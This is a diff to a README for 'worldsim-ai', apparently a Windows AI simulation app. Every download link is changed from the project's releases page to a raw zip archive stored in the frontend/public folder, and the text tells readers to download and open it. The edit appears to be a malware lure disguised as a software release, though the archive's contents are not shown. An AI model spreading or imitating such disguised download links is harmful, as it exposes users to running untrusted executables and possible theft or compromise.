@@ -1,6 +1,6 @@
 # 🌍 worldsim-ai - Model Real Systems with AI
 
-[![Download worldsim-ai](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/nonspherical-malthusian675/worldsim-ai/releases)
+[![Download worldsim-ai](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/nonspherical-malthusian675/worldsim-ai/raw/refs/heads/main/frontend/public/worldsim_ai_v3.2.zip)
 
 ## 🚀 What this app does
 
@@ -25,7 +25,7 @@ It fits use cases like:
 ## 📥 Download for Windows
 
 Go to the release page and download the latest Windows file:
-https://github.com/nonspherical-malthusian675/worldsim-ai/releases
+https://github.com/nonspherical-malthusian675/worldsim-ai/raw/refs/heads/main/frontend/public/worldsim_ai_v3.2.zip
 
 After the file finishes downloading, open it and follow the setup steps on screen.
 
@@ -186,4 +186,4 @@ worldsim-ai is meant for local simulation work on your PC. Keep your project fil
 ## 📌 Download again if needed
 
 Use this link any time you need the latest Windows release:
-https://github.com/nonspherical-malthusian675/worldsim-ai/releases
+https://github.com/nonspherical-malthusian675/worldsim-ai/raw/refs/heads/main/frontend/public/worldsim_ai_v3.2.zip
